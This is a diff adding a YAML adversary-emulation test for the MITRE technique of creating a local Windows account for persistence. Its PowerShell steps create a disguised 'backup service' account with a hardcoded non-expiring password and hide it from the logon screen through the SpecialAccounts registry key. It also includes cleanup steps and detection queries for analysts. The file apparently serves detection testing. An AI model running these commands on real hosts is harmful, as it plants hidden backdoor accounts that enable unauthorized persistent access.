@@ -1,0 +1,91 @@
+id: T1136.001_create_account_local
+name: "Create Account — Local Account"
+mitre_technique: "T1136.001"
+mitre_tactic: "persistence"
+description: >
+  Adversaries create local user accounts on compromised hosts to maintain persistent
+  access even if the initial access vector (malware, stolen credentials) is remediated.
+  The new account provides a secondary access path via RDP, WinRM, or local logon.
+  Adversaries often disguise the account as a legitimate service or admin account
+  (e.g. svc_backup, IT_admin, support). The account may also be added to local groups
+  for elevated access (see T1098.007). Event ID 4720 fires when any local account
+  is created.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1136/001/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1136.001 — Create Local Account persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a backdoor local account — mimics adversary naming convention"
+    command: |
+      $username = "PAS_T1136_001_svcback"
+      $password = ConvertTo-SecureString "PAS-BackdoorPass-123!" -AsPlainText -Force
+
+      New-LocalUser -Name $username -Password $password `
+          -FullName "Windows Backup Service" `
+          -Description "System backup maintenance account" `
+          -PasswordNeverExpires $true `
+          -UserMayNotChangePassword $true `
+          -ErrorAction SilentlyContinue | Out-Null
+      Write-Host "[PAS] Local account created: $username"
+      Write-Host "[PAS] Event ID 4720 (Account created) should fire"
+
+  - step: 3
+    type: exec_powershell
+    description: "Hide account from login screen — add to special registry key"
+    command: |
+      $username = "PAS_T1136_001_svcback"
+      # Adversaries hide backdoor accounts from the logon screen
+      $hideKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+      if (-not (Test-Path $hideKey)) {
+          New-Item -Path $hideKey -Force | Out-Null
+      }
+      Set-ItemProperty $hideKey -Name $username -Value 0 -Type DWord
+      Write-Host "[PAS] Account hidden from logon screen: $username (SpecialAccounts\UserList = 0)"
+      Write-Host "[PAS] Account invisible to normal users but still accessible via RDP/WinRM"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — Event ID 4720 (account created), SpecialAccounts\\UserList registry change"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove backdoor account and hidden account registry entry"
+    command: |
+      $username = "PAS_T1136_001_svcback"
+      Remove-LocalUser -Name $username -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Local account removed: $username"
+
+      $hideKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+      Remove-ItemProperty $hideKey -Name $username -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] SpecialAccounts registry entry removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1136.001 cleanup complete"
+
+analyst_checklist:
+  - "Event ID 4720: A user account was created — always review new local accounts"
+  - "Registry event: HKLM\\...\\SpecialAccounts\\UserList — value set to 0 hides account from logon"
+  - "Sentinel: SecurityEvent | where EventID == 4720 and TargetUserName !contains '$'"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'SpecialAccounts\\\\UserList'"
+  - "MDE alert: 'New local account created' or 'Account hidden from logon screen'"
+  - "CONTROL CHECK: Alert on any new local account not created by the IT provisioning process"
+  - "CONTROL CHECK: Audit SpecialAccounts\\UserList registry key — any account listed there is intentionally hidden"
+  - "CONTROL CHECK: LAPS ensures unique local admin passwords — a backdoor account with a known password is easier to detect"
